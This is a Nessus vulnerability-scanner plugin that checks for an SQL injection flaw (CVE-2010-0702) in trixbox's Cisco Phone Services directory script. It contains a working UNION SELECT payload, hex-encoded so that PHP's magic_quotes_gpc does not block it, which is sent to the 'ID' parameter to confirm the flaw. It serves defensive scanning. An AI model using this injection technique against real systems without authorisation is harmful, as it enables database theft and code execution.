#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(44875);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/05/19 18:02:20 $");

  script_cve_id("CVE-2010-0702");
  script_bugtraq_id(38323);
  script_osvdb_id(62572);
  script_xref(name:"EDB-ID", value:"11508");

  script_name(english:"trixbox Cisco Phone Services PhoneDirectory.php ID Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a work phone number");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of the Cisco Phone Services phone directory script
('cisco/services/PhoneDirectory.php') installed as part of the web
interface for trixbox (or Asterisk@Home, as it was formerly known) and
hosted on the remote web server fails to sanitize input to the 'ID'
parameter before using it in a database query.

Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated, remote attacker can leverage this issue to manipulate
SQL queries and, for example, uncover sensitive information from the
associated database, read arbitrary files, or execute arbitrary PHP
code.");
  script_set_attribute(attribute:"solution", value:"There is currently no known solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:fonality:trixbox");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("trixbox_web_detect.nbin");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/trixbox", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
get_kb_item_or_exit("www/trixbox");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/cisco/services", cgi_dirs()));
else dirs = make_list("/cisco/services");

script_found = FALSE;
foreach dir (dirs)
{
  # Try to exploit the issue to manipulate the work phone number.
  exploit = "-" + rand() % 1000 + "' UNION SELECT 0,0,0,0," + hexify(str:SCRIPT_NAME) + ",0,0 -- '";

  # Try to exploit the issue.
  url = dir + '/PhoneDirectory.php?' +
    'ID=' + str_replace(find:" ", replace:"%20", string:exploit);

  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail : TRUE);

  if (res[2] && '<CiscoIPPhone' >< res[2])
  {
    script_found = TRUE;

    if (
      '<CiscoIPPhoneDirectory>' >< res[2] &&
      '<Name>Work:</Name>' >< res[2] &&
      '<Telephone>'+SCRIPT_NAME+'</Telephone>' >< res[2]
    )
    {
      set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

      if (report_verbosity > 0)
      {
        report = '\n' +
          'Nessus was able to verify the issue by manipulating the work phone\n' +
          'number for a random ID using the following URL :\n' +
          '\n' +
          '  ' + build_url(port:port, qs:url) + '\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
install = build_url(qs:"/", port:port);
if (!script_found) audit(AUDIT_WEB_APP_EXT_NOT_INST, "trixbox", install, "Cisco Phone Services directory script");
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, "trixbox", install, "Cisco Phone Services directory script");
